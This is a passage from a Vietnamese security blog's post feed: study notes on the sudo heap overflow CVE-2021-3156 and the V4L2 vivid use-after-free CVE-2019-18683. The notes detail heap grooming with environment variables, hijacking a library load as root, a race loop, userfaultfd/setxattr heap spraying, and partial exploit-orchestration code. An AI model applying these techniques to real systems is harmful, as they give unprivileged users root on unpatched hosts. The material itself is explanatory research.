175 ? strlen(modifier) + 1 : 0) 176 + 1 + strlen(filename) +1); Nếu locale name không nằm trong danh sách được load, hàm _nl_make_l10nflist được gọi một lần nữa để tạo ra tất cả các đường dẫn có thể (đường dẫn cơ bản là /usr/lib/locale) từ việc kết hợp những thành phần và đặc tính của tên bằng gọi đệ quy chính đó với \u0026ldquo;mask\u0026rdquo; đã được sửa đổi. Thuật toán này sẽ tạo ra một duplicated part (malloc) và rồi xóa nó (free) sau khi kiểm tra xong. Càng nhiều thành phần trong locales thì sẽ có càng nhiều hàm malloc và free được gọi. Sau đó, hàm _nl_find_locale cố gắng load locale data từ từng đường dẫn một. Nếu tìm thấy một locale data hợp lệ, hàm setlocale sẽ sawpx xếp tên miền nhất định và lưu nó trong nội bộ. Nếu có lỗi xảy ra, hàm setlocale sẽ giải phóng tất cả các tên đã được lưu và mặc định sử dụng C rồi trả về ngay lâp tức. Do đó, locale name không thể ngẫu nhiên, ít nhất ngôn ngữ và bộ mã phải hợp lệ. Sau khi tất cả tên danh mục đều được strdup() và dữ liệu được load, LC_ALL sẽ được tạo trong hàm new_composite_name. Nếu tất cả các tên LC giống nhau, giá trị của nó sẽ chỉ được lấy từ tên đầu tiên, ngược lại, nếu không giống, giá trị sẽ được kết hợp lại với nhau. Kiểm soát heap usage bằng biến môi trường. Một số giá trị của biến môi trường giúp cho việc khai thác lỗi này:\nThiết lập môi trường \u0026quot;TZ=:\u0026quot;: giảm số lần sử dụng heap trong hàm glibc tzset() và hoàn toàn có thể tiên đoán trước. Thêm \u0026quot;;x=x\u0026quot; trong mọi biến môi trường LC, luồng thực thi sẽ như sau: Đầu tiên, hàm setlocale(\u0026quot;\u0026quot;) sẽ cấp phát và giải phóng một cách bình thường, LC_ALL sẽ có giá trị \u0026quot;...;x=x;...\u0026quot; Sau đó, setlocale(NULL) lấy giá trị LC_ALL hiện tại và lưu lại. setlocale(\u0026quot;C\u0026quot;) sẽ giải phóng tất cả locale name nhận được. setlocale(saved_LC_ALL) sẽ không làm gì, vì x là tên danh mục không hợp lệ. Tới đây, LC_ALL trong glibc là \u0026ldquo;C\u0026rdquo; setlocale sẽ không làm gì bởi vì LC_ALL là C Kết quả chúng ta sẽ có một vùng được giải phóng với kích thước được kiểm soát bằng cách thiết lập môi trường LC Cấu trúc service_user 1 2 3 4 5 6 7 8 9 10 11 12 13 typedef struct service_user { /* And the link to the next entry. */ struct service_user *next; /* Action according to result. */ lookup_actions actions[5]; /* Link to the underlying library object. */ service_library *library; /* Collection of known functions. */ void *known; /* Name of the service (`files\u0026#39;, `dns\u0026#39;, `nis\u0026#39;, ...). */ char name[0]; } service_user; -Cấu trúc này được sử dụng trong nss_load_library của libc khá thường xuyên khi vấn đề overflow xảy ra (trace log) để load những thư viện liên kết động lên. Chúng ta có thể ghi đè trường name và tải thư viện của chúng ta lên.\nSau đó, chúng ta nhắm tới những thư viện mà không có đặc quyền, chạy nó với quyền root. Hàm như sau: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 static int nss_load_library (service_user *ni) { if (ni-\u0026gt;library == NULL) { static name_database default_table; ni-\u0026gt;library = nss_new_service (service_table ?: \u0026amp;default_table, ni-\u0026gt;name); if (ni-\u0026gt;library == NULL) return -1; } if (ni-\u0026gt;library-\u0026gt;lib_handle == NULL) { /* Load the shared library. */ size_t shlen = (7 + strlen (ni-\u0026gt;name) + 3 + strlen (__nss_shlib_revision) + 1); int saved_errno = errno; char shlib_name[shlen]; /* Construct shared object name. */ __stpcpy (__stpcpy (__stpcpy (__stpcpy (shlib_name, \u0026#34;libnss_\u0026#34;), ni-\u0026gt;name), \u0026#34;.so\u0026#34;), __nss_shlib_revision); ni-\u0026gt;library-\u0026gt;lib_handle = __libc_dlopen (shlib_name); Mục tiêu của hàm này là đến ni-\u0026gt;library-\u0026gt;lib_handle = __libc_dlopen(shlib_name) để tải thư viện mà chúng ta kiểm soát. Có hai điều mà chúng ta cần lưu ý: Nếu ni-\u0026gt;library khác NULL, chúng ta sẽ sử dụng con trỏ trong ni-\u0026gt;library-\u0026gt;lib_handle và vì ASLR nên chúng ta không thể đoán liệu rằng con trỏ này có hợp lệ hay không. Chúng ta thiết lập ni-\u0026gt;library=nss_new_service(...) nếu con trỏ này NULL, sau đó chúng ta chỉ cần ghi đè cấu trúc này để lấy được tên trường và đổi nó tới những thư viện mà chúng ta kiểm soát. Thách thức thứ 2 là chúng ta có con trỏ struct service_user *next. Nếu chúng ta gây ra overflow Ghi đè cấu trúc service_user bằng glibc tcache Từ trace log, chúng ta thấy 2 lệnh gọi nss_load_library. Sau đó ta kiểm tra xem service_user object được tạo ở vị trí nào\nNó được tạo từ \u0026ldquo;nhóm\u0026rdquo; các dòng trong file \u0026ldquo;nsswitch.conf\u0026rdquo;. Như chúng ta thấy, sudo sẽ tạo ra service_user objects (từ 2 dịch vụ trong passwd line). Do đó, mã thực thi của chúng ta sẽ đọc file nsswitch.conf đẻ xác định offset hoặc số lượng chunk size = 0x40 được tạo. Thiết lập TZ=: và ;x=x trong môi trường LC sẽ giúp chúng ta điều khiển việc sử dụng heap trước khi phân tích file \u0026quot;/etc/nsswitch.conf\u0026quot; Trace hàm malloc/free từ lệnh gọi hàm sudo_conf_read_v1 tới lệnh get_user_info ta sẽ được như dưới\nlàm sao để trace được như tác giả\rVí dụ, ta thiết lập môi trường \u0026quot;LC_CTYPE=C.UTF-8@\u0026quot; + \u0026quot;A\u0026quot;*0x28 và \u0026quot;LC_NUMERIC=C.UTF-8@\u0026quot;+\u0026quot;A\u0026quot;*0x86. Chunk size của LC_CTYPE là 0x30+8 (8 là kích thước của heap metadata), sau đó được làm tròn lên 0x40 và chunk size của LC_NUMERIC là 0x80. Rồi chúng ta sẽ được bố cục tượng tự như hình bên cho nsswitch.conf với 2 dịch vụ cho passwd. 1 2 3 4 LC_COLLATE LC_TIME LC_NUMERIC LC_CTYPE --+-------------+----+------------+---+-------------+---+-------------+--- | free 0x40 | .. | free 0x40 |...| free 0x80 |...| freed 0x40 | --+-------------+----+------------+---+-------------+---+-------------+--- Do đó, sẽ hướng đến servirce_user object tại vùng nhớ LC_CTYPE bị giải phóng và thực hiện heap overflow tại LC_NUMERIC để ghi đè service_user object\n","description":"Lỗi cho phép người dùng bình thường lấy được root mà không cần biết mật khẩu của root","id":13,"section":"posts","tags":["cve, linux kernel, V4l2"],"title":"Tìm hiểu về CVE-2021–3156 (A Sudo vulnerability)","uri":"https://minhlongmt183.github.io/posts/cve-2021-3156/"},{"content":"\rBài viết này nhằm mục đích ghi lại những kiến thức đã học để nhớ và hiểu rõ hơn. Bài viết tham khảo chủ yếu từ CVE-2019-18683: Exploiting a Linux kernel vulnerability in the V4L2 subsystem\rVulnerabilities chúng ta tải source code kernel về và xem tại: linux-x/drivers/media/platform/vivid/\rLỗ hổng bắt nguồn từ sai sót trong hiện thực, sử dụng mutex lock của driver vivid trong subsystem V4L2 - (drivers/media/platform/vivid). Driver này không yêu cầu bất cứ phần cứng đặc biệt nào. Nó đóng vai trò như một kernel module (CONFIG_VIDEO_VIVID=m) trong các hệ điều hành như: Ubuntu, Debian, Arch Linux, SUSE Linux Enterprise, and openSUSE. Driver vivid mô phỏng phần cứng video4linux của nhiều loại: video capture, video output, radio receivers and transmitters and a software defined radio receivers. Những input và output sẽ hoạt động giống như những thiết bị vật lí thật, do đó, nó cho phép ứng dụng thực hiện mà không cần bất cứ thiết bị phần cứng đặc biệt nào. Trên Ubuntu, những thiết bị được tạo bởi driver vivid đều hoạt động cho người dùng bình thường, vì ubuntu sử dụng RW USAL khi người dùng đăng nhập open, read và close trong vivid open Hàm này thì không có gì đặc biệt với trường hợp lỗi này, nó chỉ đơn giản được gọi để bật thiết bị\nread Chúng ta cùng theo flow của lệnh read này\nstateDiagram\rread --\u0026gt; vfd_read\rvfd_read --\u0026gt; vb2_fop_read\rvb2_fop_read --\u0026gt; __vb2_perform_fileio\r__vb2_perform_fileio --\u0026gt; vb2_core_reqbufs\rvb2_core_reqbufs --\u0026gt; vb_queue_alloc\r__vb2_perform_fileio --\u0026gt; vb2_core_qbuf\r__vb2_perform_fileio --\u0026gt; vb2_core_streamon\rvb2_core_streamon --\u0026gt; vb2_start_streaming\rvb2_start_streaming --\u0026gt; __enqueue_in_driver\rvb2_start_streaming --\u0026gt; vbi_cap_start_streaming\r__vb2_perform_fileio --\u0026gt; vb2_core_dqbuf vb2_queue: hàng đợi này sẽ chứa vb2_buffer của ứng dụng, được lưu ở `vb2_queue-\u0026gt;bufs) vb2_buffer: lưu thông tin về các hoạt động của video stream. Khi lệnh read thực hiện, nó gọi vb_queue_alloc để cấp phát vùng nhớ (kmalloc-1k) để chứa những thông tin từ vb2_buffer và sau đó lấy những thông tin này ra để thực hiện. Quá trình data streaming thực chất là quá trình viết và đọc từ buffer vb2_buffer được thêm vào vb2_queue (vb2_queue-\u0026gt;queued_list) Điều chú ý ở đây, khóa dev-\u0026gt;mutex của vb2_fop_read và khóa tại vb2_queue-\u0026gt;lock là một khóa. xem hiện thực tại đây Sau khi vb_buffer được thêm vào hàng đợi, chương trình sẽ bắt đầu streaming, gọi vb2_start_streaming để đưa dữ liệu vào vb_buffer. Quá trình này nó sẽ gọi __enqueue_in_driver để thêm buffer vào vivid_dev, hàng đợi vid_cap_active để được xử lí. Quá trình trên tương đương với việc gọi hàm vid_cap_buf_queue 1 2 3 4 5 6 7 8 9 10 static void vid_cap_buf_queue(struct vb2_buffer *vb) { struct vb2_v4l2_buffer *vbuf = to_vb2_v4l2_buffer(vb); struct vivid_dev *dev = vb2_get_drv_priv(vb-\u0026gt;vb2_queue); struct vivid_buffer *buf = container_of(vbuf, struct vivid_buffer, vb); spin_lock(\u0026amp;dev-\u0026gt;slock); list_add_tail(\u0026amp;buf-\u0026gt;list, \u0026amp;dev-\u0026gt;vid_cap_active);// spin_unlock(\u0026amp;dev-\u0026gt;slock); } Sau đó gọi vid_cap_start_streaming, hàm này sẽ gọi vivid_start_generating_vid_cap để khởi tạo 1 kernel thread thực hiện hàm vivid_thread_vid_caption\n1 2 dev-\u0026gt;kthread_vid_cap = kthread_run(vivid_thread_vid_cap, dev, \u0026#34;%s-vid-cap\u0026#34;, dev-\u0026gt;v4l2_dev.name); Hàm vivid_thread_vid_cap này có nhiệm vụ đưa dữ liệu vào vb2_buffer. Sau dữ liệu được đưa xong, nó sẽ bước vòng 1 vòng lặp vô hạn, ngồi đợi lấy khóa lock(mutex_lock(\u0026amp;dev-\u0026gt;mutex)), khi nhận được khóa, dữ liệu trên vb2_buffer mới được xử lí. Như đã nói, vb2_fop_read cũng có khóa, và khóa này với khóa ở bước trên vivid_thread_vid_cap là một, điều này có nghĩa, khi thread đang thực hiện vivid_thread_vid_cap mở khóa, một thread nào đó thực hiện vb2_fop_read có khóa, nó có thể vào vùng nhớ này để thực hiện. Giống như ngôi nhà chỉ có thể chưa 1 người, có 2 người giữ chìa khóa, khi 1 người bên trong đi ra, người còn lại nếu đang giữ chìa khóa, anh ta hoàn toàn có thể vào căn nhà. Căn nhà ở đây là vb2_buf, còn 2 người lần lượt là 2 thread đang chạy vivid_thread_vid_cap và vb2_fop_read.\nNhưng tại sao đang giữ khóa rồi lại mở khóa, sau đó lại chờ có lại khóa, tôi vẫn chưa hiểu tại sao lại như thế, nhưng đây chính là nguyên nhân gây ra CVE này. Quan sát kĩ hơn về hàm vb2_core_dqbuf: stateDiagram\rvb2_core_dqbuf --\u0026gt; __vb2_get_done_vb\r__vb2_get_done_vb --\u0026gt; __vb2_wait_for_done_vb\r__vb2_wait_for_done_vb --\u0026gt; vb2_ops_wait_prepare\r__vb2_wait_for_done_vb --\u0026gt; vb2_ops_wait_finish Ở đây, vb2_ops_wait_prepare sẽ trả khóa vb2_queue-\u0026gt;lock, vb2_ops_wait_finish sẽ chờ nhận khóa và kết thúc.\nHay nói cách khác, vb2_core_dqbuf sẽ trả khóa, vivid_thread_vid_cap có khóa sẽ vào thực hiện, vb2_core_dqbuf phải chờ vivid_thread_vid_cap thực hiện xong, đưa lại khóa rồi mới hoàn tất việc của mình.\nVấn đề chính là ở bước này. giống như việc bạn mượn phòng trong vòng 45\u0026rsquo; rồi bạn phải khóa phòng, đem chìa khóa xuống cho bảo vệ để bảo vệ lên kiểm tra, bảo vệ kiểm tra xong sẽ đưa lại chìa khóa cho bạn để bạn vào phòng tiếp. Nhưng trong quá trình bạn đem chìa khóa xuống cho bảo vệ thì 1 người khác có được chiếc chìa khóa này, họ hoàn toàn có thể vào phòng lúc này. Kì vọng của người lập trình là muốn vivid_thread_vid_cap đi vào khi vb2_core_dqbuf trả khóa, nhưng lúc này, nếu 1 process khác đang chạy và gọi vb2_fop_read thì họ sẽ có được chìa khóa này.\nBên dưới là ảnh khi debug, có thể thấy mặc dù hàm vivid_thread_vid_cap đã thực thi xong hết rồi vb2_fop_read không kết thúc ngay, nó lại gọi vb2_core_qbuf một lần nữa. Khi đó, hàm này lại vào đọc dữ liệu mà vốn dĩ đà được thực hiện xong bởi 1 process khác. Khi nó gọi __enqueue_in_driver, vb2_buffer sẽ được thêm vào hàng đợi dev-\u0026gt;vid_cap_active để thực hiện. Sau đó vb2_fop_read mới kết thúc. Điều này dẫn tới, sau khi vb2_fop_read kết thúc, thì địa vb2_buffer lại được lưu trong dev-\u0026gt;vid_cap_active để chuẩn bị cho 1 process khác thực hiện. Khi tìm hiểu về dev-\u0026gt;vid_cap_active thì tôi thấy nó được sử dụng bởi 3 hàm: vivid_thread_vid_cap, vid_cap_start_streaming và vivid_stop_generating_vid_cap. vivid_thread_vid_cap: lấy tất cả dữ liệu trong hàng đợi vid_cap_active ra, do đó, sau khi thực hiện xong, buffer sẽ không còn trong hàng đợi. vid_cap_start_streaming mục đích chính là kiểm tra xem trạng thái của buffer và thực hiện một số chuyển đổi, sau khi thực hiện xong, buffer vẫn còn trong hàng đợi. vivid_stop_generating_vid_cap được dùng trong hàm close(fd), dùng để xóa tất cả các dữ liệu trong hàng đợi, bao gồm cả buffer. close Chúng ta đã tìm hiểu về hàm read và thấy rằng sau khi thực hiện hàm read, vb2_buffer lại được 1 process khác đưa vào hàng đợi để chuẩn bị cho quá trình thực hiện. Vậy khi process hiện tại thực hiện xong lệnh close thì vb2_buffer sẽ bị ảnh hưởng như thế nào? Chúng ta hãy cùng xem flow khi gọi hàm close\nstateDiagram\rvivid_fop_release --\u0026gt; vb2_fop_release\rvb2_fop_release --\u0026gt; vb2_queue_release\rvb2_queue_release --\u0026gt; vb2_core_queue_release\rvb2_core_queue_release --\u0026gt; __vb2_cleanup_fileio\r__vb2_cleanup_fileio --\u0026gt; vb2_core_streamoff\rvb2_core_streamoff --\u0026gt; __vb2_queue_cancel\r__vb2_queue_cancel --\u0026gt; vivid_stop_generating_vid_cap\r__vb2_cleanup_fileio --\u0026gt; vb2_core_reqbufs\rvb2_core_reqbufs --\u0026gt; __vb2_queue_free Nhìn vào lược đồ trên, ta thấy khá đơn giản, tuy nhiên có một chú ý:\nHàm vivid_stop_generating_vid_cap trả khóa, rồi gọi kthread_stop để dừng kernel thread đang thực hiện hàm vivid_thread_vid_cap.\nNếu như kết thúc hàm read() nó chỉ tạo ra một nguy cơ xảy ra lỗi uaf, thì tại đây chính là nguyên nhân gây ra lỗi uaf. 1 2 3 4 mutex_unlock(\u0026amp;dev-\u0026gt;mutex); kthread_stop(dev-\u0026gt;kthread_vid_cap); dev-\u0026gt;kthread_vid_cap = NULL; mutex_lock(\u0026amp;dev-\u0026gt;mutex); Sau khi vivid_stop_generating_vid_cap thực hiện xong, nó sẽ gọi hàm __vb2_queue_free để giải phóng vb2_queue-\u0026gt;bufs và vb2_buffer, ròi đóng process hiện tại. Đừng quên rằng, vb2_buffer ngay lúc này đang được 1 process khác đưa vào hàng đợi vid_cap_active để chuẩn bị thực thi. Điều này dẫn tới lỗi UAF\nBugs and Fixes Tác giả sử dụng skyzkaller fuzzer với những tùy chỉnh trong kernel source code và thấy những crash trong kernel. KASAN phát hiện ra lỗi use-after-free trong các thao tác danh sách liên kết trong vid_cap_buf_queue(). Nguyên nhân là do sự sai sót trong quá trình sử dụng khóa (mutex lock) trong vivid_stop_generating_vid_cap(), vivid_stop_generating_vid_out() và sdr_cap_stop_streaming(). Những hàm trên được gọi khi bị khóa vivid_dev.mutex, quá trình streaming bị dừng. Chúng cùng mắc phải một lỗi là khi muốn dừng kthreads thì nó cũng cần phải khóa mutex này. Ví dụ, trong hàm vivid_stop_generating_vid_cap(): 1 2 3 4 5 6 /* shutdown control thread */ vivid_grab_controls(dev, false); mutex_unlock(\u0026amp;dev-\u0026gt;mutex); kthread_stop(dev-\u0026gt;kthread_vid_cap); dev-\u0026gt;kthread_vid_cap = NULL; mutex_lock(\u0026amp;dev-\u0026gt;mutex); Tuy nhiên, khi mutex được unlocked, một hàm khác vb2_fop_read() có thể khóa nó thay vì kthread và thao tác trên hàng đợi (buffer queue). Điều này dẫn tới khả năng xảy ra use-after-free sau này khi streaming hoạt động trở lại.\nchưa biết cách sử dụng skyzkaller fuzzer.\nVì sao dẫn tới khả năng xảy ra use-after-free? (đã trả lời trong cơ chế hàm read, close trong vivid)\rĐể giải quyết tình trạng trên, tác giả đề xuất như sau: Không mở khóa mutex khi stream dừng. Ví dụ ở hàm vivid_stop_generating_vid_cap() chúng ta sẽ bỏ 2 hàm: 1 2 3 4 5 6 /* shutdown control thread */ vivid_grab_controls(dev, false); -\tmutex_unlock(\u0026amp;dev-\u0026gt;mutex); kthread_stop(dev-\u0026gt;kthread_vid_cap); dev-\u0026gt;kthread_vid_cap = NULL; -\tmutex_lock(\u0026amp;dev-\u0026gt;mutex); Sử dụng mutex_trylock() với schedule_timeout_uninterruptible() trong vòng lặp của vivid kthread handler. Hàm xử lí vivid_thread_vid_cap() được thay đổi như sau: 1 2 3 4 5 6 7 8 9 10 11 for (;;) { try_to_freeze(); if (kthread_should_stop()) break; -\tmutex_lock(\u0026amp;dev-\u0026gt;mutex); +\tif (!mutex_trylock(\u0026amp;dev-\u0026gt;mutex)) { +\tschedule_timeout_uninterruptible(1); +\tcontinue; +\t} ... } Nếu mutex này không hoạt động, kthread sẽ ngủ trong giây lát rồi thử lại. Trong trường hợp xấu nhất, kthread sẽ ngủ vài lần và chạm đến break để thoát khỏi vòng lặp hiện tại.\nWinning the race Chúng ta đã hiểu tại sao lại vivid lại có thể dẫn tới lỗi UAF, bây giờ chúng ta sẽ tiến hành khai thác lỗi này. Để test kernel, chúng ta cần đảm bảo: Đã có vivid driver /dev/video0 is the V4L2 capture device Chúng ta đã login Chúng ta tạo 2 pthreads. Trường hợp này, bắt buộc sử dụng ched_setaffinity để racing tốt hơn. 1 2 3 4 5 6 7 cpu_set_t single_cpu; CPU_ZERO(\u0026amp;single_cpu); CPU_SET(cpu_n, \u0026amp;single_cpu); ret = sched_setaffinity(0, sizeof(single_cpu), \u0026amp;single_cpu); if (ret != 0) err_exit(\u0026#34;[-] sched_setaffinity for a single CPU\u0026#34;); Chúng ta tiến hành race 1 2 3 4 5 6 7 8 9 10 for (loop = 0; loop \u0026lt; LOOP_N; loop++) { int fd = 0; fd = open(\u0026#34;/dev/video0\u0026#34;, O_RDWR); if (fd \u0026lt; 0) err_exit(\u0026#34;[-] open /dev/video0\u0026#34;); read(fd, buf, 0xfffded); close(fd); } Khai bắt đầu streaming hàm vid_cap_start_streaming() sẽ , được gọi bởi V4L2 trong khi vb2_core_streamon() đọc từ file descriptor. Khi dừng streaming, hàm vivid_stop_generating_vid_cap() sẽ được V4L2 gọi trong khi __vb2_queue_cancel() sẽ giải phóng tham khảo cuối cùng đến file. Do đó, nếu một trình đọc khác \u0026ldquo;chiến thắng\u0026rdquo; kthreads, nó sẽ gọi vb2_core_qbuf(), hàm này sẽ thêm vb2_buffer vào vb2_queue.queued_list. Khi chạy đoạn code trên, chúng ta có thể sẽ được kết quả như sau:\nTa có 2 thread chạy trên 2 CPU khác nhau, màu đỏ đại diện thread A, màu xanh đại diện thread B Thread A Thread B Chạy vb2_core_dqbuf, trả khóa (giả sử vivid_thread_vid_cap đã có khóa) vb2_fop_read lấy được khóa, thực hiện và có vẻ không thỏa mãn điều kiện nào đó nên dừng, trả khóa lại vivid_thread_vid_cap nhận được khóa, giải phóng buffer thực hiện hàm close(fd), gọi hàm vivid_stop_genrating_vid_cap để xóa hàng đợi vid_cap_active ra khỏi thiết bị, trả khóa (hi vọng vivid_thread_vid_cap sẽ lấy được khóa này) vb_core_dqbuf lấy được khóa, gọi __enqueue_in_driver để thêm vb2_buffer vào hàng đợi. Thực hiện lệnh read và giải phóng khóa vivid_stop_generating_vid_cap nhận được khóa và thực hiện lệnh close(fd) để đóng process và giải phóng vùng nhớ vb2_buffer, vùng nhớ này vẫn còn nằm trong hàng đợi vid_cap_active, và có thể được dùng cho lần đọc tiếp teho -\u0026gt; lỗi UAF Bước vào vòng lặp mới, đợi có khóa để gọi vivid_thread_vid_cap để đưa vùng nhớ vb2_buffer cũ vừa bị kfree vào vivid_fillbuff vì vùng nhớ bị kfree nên sẽ bị xóa đi những trường cần thiết cho quá trình thực hiện, nên sau đó chương trình sẽ bị crash Deceived V4L2 sub system Khi streaming dừng hẳn, tham khảo cuối cùng tới /dev/video0 được giải phóng, V4L2 subsystem calls sẽ gọi vb2_core_queue_release() để giải phóng tài nguyên. Hệ thống sẽ lần lượt gọi __vb2_queue_free() để giải phóng vb2_buffer - đã được thêm vào hàng đợi khi mà exploit cảu chúng ta thắng race.\nTuy nhiên, driver không biết điều đó và vẫn giữ tham khảo đến một object đã được giải phóng. Khi stream bắt đầu lại, nó sẽ nhảy vào exploit loop, vivid driver sẽ chạm đến đối tượng bị giải phóng và điều này đã được KASAN phát hiện. Heap spraying Heap spraying là kĩ thuật, mục đích đặt những controlled bytes vào những vị trí có thể xác định trước trên heap. Kĩ thuật này thường liên quan tới việc cấp phát nhiều đối tượng trên heap với controlled contents và làm sao để một số allocator để cấp phát ngay vùng nhớ trên. Heap spraying sử dụng để khai thác use-after-free trong Linux Kernel sẽ thường dùng kmalloc() vì hàm này sẽ trả về địa chỉ của vùng nhớ vừa được free. Do đó, nếu cấp phát một đối tượng, cùng địa chỉ với controlled contents sẽ cho phép chúng ta ghi đè vùng nhớ có thể khai thác.\nẢnh tham khảo từ: https://a13xp0p0v.github.io/2020/02/15/CVE-2019-18683.html Kĩ thuật này có thể được triển khai bằng cách sử dụng kết hợp userfaultfd() + setxattr() với ý tưởng chính rằng userfaultfd() sẽ cho phép chúng ta kiểm soát được lifetime của dữ liệu được cấp phát bởi setxattr() trong kernelspace. Quay trở về với lỗ hổng này, vb2_buffer sẽ được free khi streaming dừng và sẽ được use ở lần streaming tiếp theo. Do đó, nếu chúng ta sử dụng kĩ thuật heap spraying vào cuối vòng lặp thứ nhất trước khi streaming stop thì khi streaming bắt đầu ở vòng lặp kế tiếp thì chúng ta có thể dùng kmalloc() để cấp phát vùng nhớ vừa free ở cuối vòng lặp trước với controlled data. Tuy nhiên, lúc bấy giờ, tác giả phát hiện ra một vấn đề: vùng nhớ vb2_buffer không phải là vùng nhớ cuối cùng được giải phóng bởi __vb2_queue_free(), do đó, ở vòng lặp tiếp theo, khi gọi kmalloc) thì nó sẽ không trả về đúng địa chỉ mà chúng ta cần. Vì thế, chúng ta cần phải allocate nhiều lần để có thể cấp phát đúng được vị trí mong muốn. Nhưng muốn áp dụng điều trên với hai hàm userfaultfd() + setxattr() là không dễ dàng vì: dữ liệu do setxattr() cấp phát chỉ tồn tại cho đến khi trình xử lí lỗi trang userfaultfd() gọi hàm ioctl với flag UFFDIO_COPY. Hay nói cách khác, muốn dữ liệu được cấp phát bởi setxattr() không bị mất thì userfaultfd() không gọi ioctl. Tác giả giải quyết vấn đề này bằng cách tạo ra một pool of threads: mỗi thread này được gọi là spraying thread, gọi hàm setxattr() được xử lí bởi userfaultfd() và lưu dữ liệu được cấp phát. Tôi vẫn chưa biết tât cả các spraying thread đều được xử lí bởi userfaultfd() hay mỗi spraying thread sẽ có 1 userfaultfd() tương ứng (sẽ được giải thích ở những mục dưới)\rBây giờ, chúng ta sẽ viết payload gì vào vb2_buffer?\nControl flow hijack for V4L2 subsystem Lược đồ dưới đây đặc tả sơ lược mối quan hệ giữa các object trong V4L2 subsystem\nTại đây thì tác giả bảo ông ấy tốn khá nhiều thời gian để tìm cách ghi nội dung tùy ý vào vb2_buffer và bằng một cách thần kỳ nào đó, ông ta đã tìm ra con đường như trên lược đồ:\nvb2_buffer.vb2_queue-\u0026gt;mem_ops-\u0026gt;vaddr\nDễ thấy, hàm vaddr() nhận vb2_buffer.planes[0].mem_priv làm tham số.\nUnexpected troubles: kthread context Chúng ta bắt đầu viết những payload để V4L2 chạm tới con trỏ hàm này. Tắt SMAP (Supervisor Mode Access Prevention), SMEP (Supervisor Mode Execution Prevention), KPTI (Kernel Page-Table Isolation) Làm vb2_buffer.vb2_queue trỏ tới một vùng nhớ được ánh xạ trên userspace. Deferencing con trỏ này sẽ cho lỗi \u0026quot;unable to handle page fault\u0026quot;.\nLí do trả về lỗi vì con trỏ mà chúng ta muốn deferencing đang ở kernel thread context, nơi mà userspace không thể ánh xạ tới. Do đó, vấn đề lúc bây giờ, làm sao đặt vb2_queue và vb2_mem_ops tại những vùng nhớ mà biết được địa chỉ, và có thể truy cập từ kthread context. Trong hàm __vb2_queue_cancel() cho phép chúng ta gửi những cảnh báo (warning), điều đó có nghĩa chúng ta có thể phân tích cú pháp của kernel warning information (có thể thực hiện trên các ubuntu server). Điều này cho phép chúng ta đưa payload vào kernel stackvà giữ nó bằng userfaultfd(), giống như kĩ thuật heap spraying sử dụng userfaultfd() + setxattr(). Hàm copy_from_user() sẽ giúp ta đưa dữ liệu vào kernel stack. Chúng ta sẽ phân tích cú pháp của warning để lấy địa chỉ của kernel stack và dự đoán dự đoán địa chỉ của payload. Exploit Orchestra Tạo ra pool of threads và đồng bộ hóa chúng bằng hàm pthread_barriers. Dưới đây là code pthread_barriersđược đặt tại các con trỏ tham khảo chính trong suốt quá trình khai thác 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 #define err_exit(msg) do { perror(msg); exit(EXIT_FAILURE); } while (0) #define THREADS_N 50 pthread_barrier_t barrier_prepare; pthread_barrier_t barrier_race; pthread_barrier_t barrier_parse; pthread_barrier_t barrier_kstack; pthread_barrier_t barrier_spray; pthread_barrier_t barrier_fatality; ... ret = pthread_barrier_init(\u0026amp;barrier_prepare, NULL, THREADS_N - 3); if (ret != 0) err_exit(\u0026#34;[-] pthread_barrier_init\u0026#34;); ret = pthread_barrier_init(\u0026amp;barrier_race, NULL, 2); if (ret != 0) err_exit(\u0026#34;[-] pthread_barrier_init\u0026#34;); ret = pthread_barrier_init(\u0026amp;barrier_parse, NULL, 3); if (ret != 0) err_exit(\u0026#34;[-] pthread_barrier_init\u0026#34;); ret = pthread_barrier_init(\u0026amp;barrier_kstack, NULL, 3); if (ret != 0) err_exit(\u0026#34;[-] pthread_barrier_init\u0026#34;); ret = pthread_barrier_init(\u0026amp;barrier_spray, NULL, THREADS_N - 5); if (ret != 0) err_exit(\u0026#34;[-] pthread_barrier_init\u0026#34;); ret = pthread_barrier_init(\u0026amp;barrier_fatality, NULL, 2); if (ret != 0) err_exit(\u0026#34;[-] pthread_barrier_init\u0026#34;); Mỗi thread có một vai trò riêng. Trong trường hợp này, ta dùng 50 thread với 5 vai trò khác nhau: 2 racer threads (THREADS_N - 6) = 44 sprayer pthreads, những thread này sẽ giữ setxattr() được xử lí bởi userfaultfd() 2 pthread cho userfaulfd() xử lí page fault. Đến đây tôi đã giải đáp được thắc mắc ở trên, 2 thread cho userfaultfd() xử lí cho 44 sprayer pthreads. 1 pthread cho phân tích /dev/kmsg và xử lí payload 1 fatility pthread chịu trách nhiệm kích hoạt leo thang đăc quyền - privilege escalation. Những con số này từ đâu mà ra hay chỉ chọn random?\rNhững thread với những vai trò khác nhau sẽ được đồng bộ hóa tại các pthread_barries khác nhau. Tham số cuối cùng của pthread_barrier_init() chỉ định số thread PHẢI gọi pthread_barrier_wait() cho từng barrier cụ thể trước khi nó tiếp tục giao tiếp với nhau. Bảng sau sẽ mô tả chi tiết tất cả các pthread với vai trò khai thác của nó, đồng bộ hóa qua pthread_barrier_wait(). barrier được liệt kê theo trình tự thời gian thực hiện. Bảng này nên được đọc theo từng dòng và đừng quên, các pthread đang thực hiện song song. pthreads 2 racers 44 sprayers page fault hander #1 page fault hander #2 kmsg parser fatality 1. barrier_prepare (for 47 pthreads) wait on barrier 1. create files in tmpfs for doing setxattr() later 2. wait on barrier \u0026mdash; \u0026mdash; 1. open /dev/kmsg 2. wait on barrier \u0026mdash; 2. barrier_race (for 2 pthreads) 1. usleep() to let other pthread go to their next barrier 2. wait on barrier 3. race \u0026mdash; \u0026mdash; \u0026mdash; \u0026mdash; \u0026mdash; 3. barrier_parse (for 3 pthreads) wait on barrier \u0026mdash; \u0026mdash; \u0026mdash; 1. wait on barrier 2. parse the kernel warning to extract RSP and R11 (contains a pointer to code) 3. Calculate the address of the kernel stack top and the KASLR offset. adapt the pointers in the payloads for kernel heap and stack. \u0026mdash; 4. barrier_kstack (for 3 pthreads) 1. wait on barrier 2. place the kernel stack payload via adjtimex() and hang \u0026mdash; \u0026mdash; \u0026mdash; wait on barrier \u0026mdash; 5. barrier_spray (for 45 pthreads) \u0026mdash; 1. wait on barrier 2. place the kernel heap payload via setxattr() and hang \u0026mdash; 1. catch 2 page faults from adjtimex() called by racers. 2. wait on barrier \u0026mdash; \u0026mdash; 6. barrier_fatality (for 2 pthreads) 